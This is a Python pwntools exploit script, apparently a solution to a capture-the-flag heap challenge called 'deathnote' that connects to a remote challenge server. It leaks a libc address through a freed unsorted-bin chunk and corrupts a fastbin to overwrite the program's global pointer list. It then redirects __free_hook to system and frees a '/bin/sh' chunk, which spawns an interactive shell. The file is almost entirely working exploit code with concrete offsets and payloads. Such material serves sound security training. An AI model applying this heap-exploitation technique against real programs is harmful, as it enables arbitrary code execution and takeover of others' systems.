#!/usr/bin/env python
from pwn import *

context.update(arch='i386')
exe = './deathnote'
libc = './libc.so.6'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('chall.nitdgplug.org', 30292)

    p = process([exe] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

gdbscript = '''
continue
handle all nostop
'''.format(**locals())


def add(index, size, name):
    log.info("Adding note with index: {} and size: {}".format(index, size))
    io.sendlineafter('5) Exit\n>', str(1))
    io.recvline()
    io.sendline(str(index))
    io.recvline()
    io.sendline(str(size))
    io.recvline()
    io.sendline(name)

    res = io.recvline()
    if b'Add' in res:
        return True

    return False


def edit(index, name):
    log.info("Editting note with index: {}".format(index))
    io.sendlineafter('5) Exit\n>', str(2))
    io.sendlineafter(':\n', str(index))
    io.sendlineafter(':\n', name)

    return io.recvline()


def remove(index):
    log.info("Removing note with index: {}".format(index))
    io.sendlineafter('5) Exit\n>', str(3))
    io.sendlineafter(':\n', str(index))

    return io.recvline()


def view(index):
    io.sendlineafter('5) Exit\n>', str(4))
    io.sendlineafter(':\n', str(index))

    return io.recvline()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# leak libc
add(0, 0x80, 'A') # that chunk will go to unsorted bin
add(1, 0x80, 'A') # that chunk will prevent top chunk consolidation of chunk #0
remove(0)

res = view(0)[10:-1]
leak = u64(res.ljust(8, b'\0'))
offset = 0x3c4b78
log.success("Got leak: 0x{:2x}".format(leak))
libc_base = leak - offset
log.success("got libc base: 0x{:2x}".format(libc_base))
libc = ELF(libc)
libc.address = libc_base
binsh = next(libc.search(b'/bin/sh'))

remove(1) # clean a bit

book = 0x602100 # global list of pointers to our chunks

add(2, 0x60, 'A') # create new chunk which will go to fastbins
add(3, 0x80, 'C') # create another chunk to prevent consolidation

remove(2)

# x/10xg 0x602100-0x20
# 0x6020e0 <size>:        0x0000008000000080      0x0000008000000060
edit(2, p64(book-0x43)) # address before our list of pointers which can pretend being real chunk (book-0x20)
add(4, 0x60, 'B')
add(5, 0x60, (b'A'*0x33) + p64(libc.symbols['__free_hook']) + p64(binsh)) # that will overwrite book list with our pointers. #0 pointer will point to __free_hook, #1 pointer will point to /bin/sh
edit(0, p64(libc.sym.system)) # edit #0 with system -> write to __free_hook

# manually remove chunk #1 -> __free_hook(chunk#1) -> system("/bin/sh")
io.sendline('3')
io.sendline('1')

io.interactive()
